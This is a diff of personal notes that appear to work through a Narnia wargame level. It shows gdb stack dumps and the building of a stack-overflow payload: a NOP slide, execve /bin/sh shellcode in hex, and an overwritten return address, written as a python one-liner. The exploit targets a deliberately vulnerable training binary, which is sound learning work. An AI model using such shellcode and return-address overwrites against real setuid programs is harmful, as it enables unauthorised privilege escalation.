@@ -60,7 +60,41 @@ Breakpoint 1, 0x0804855f in main ()
 0xffffd688:     0x90909090      0x90909090      0x90909090      0x90909090
 0xffffd698:     0x90909090      0xdeadbeef      0x00000000      0xffffd734
 
-3.) 
-**attempt to alter return address 2**
+CONCLUSION: the memory address can be rewritten but it's questionable whether it actually returns to the address specified when 
+the program exits -1 instead 1. Program exits at -1 when the input is considered invalid. Like the one above.
 
+Breakpoint 1, 0x0804855f in main ()
+(gdb) info frame
+Stack level 0, frame at 0xffffd6a0:
+ eip = 0x804855f in main; saved eip = 0xdeadbeef
+ Arglist at 0xffffd698, args:
+ Locals at 0xffffd698, Previous frame's sp is 0xffffd6a0
+ Saved registers:
+  ebp at 0xffffd698, eip at 0xffffd69c
+  
+it appears every exit function has the same address. so I guess we can presume that the altered return address will be valid
+regardless of where the program exits. time to construct our payload.
+
+3.) payload design/construction
+structure: nop slide + shellcode + address at which nop slide begins. 
+32 byte nop slide "\x90" * 32
+28 byte shellcode used in previous narnia level: 
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80
+4 byte memory address: 0xffffd658 + 4 = 0xffffd65c
+
+payload: 
+$(python -c 'print "\x90"*35 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x60\xd6\xff\xff"')
+output:
+Breakpoint 1, 0x0804855f in main ()
+(gdb) x/28x $esp
+0xffffd638:     0xffffd660      0xffffd86d      0xffffffff      0xf7fc5000
+0xffffd648:     0xf7e1ee18      0xf7fd2e28      0xf7fc5000      0xffffd734
+0xffffd658:     0xf7ffcd00      0x00200000      0x90909090      0x90909090
+0xffffd668:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd678:     0x90909090      0x90909090      0x31909090      0x2f6850c0
+0xffffd688:     0x6868732f      0x6e69622f      0x5350e389      0xc289e189
+0xffffd698:     0x80cd0bb0      0xffffd660      0x00000000      0xffffd734
+
+looks good...
+let's see if a shell appears...
 
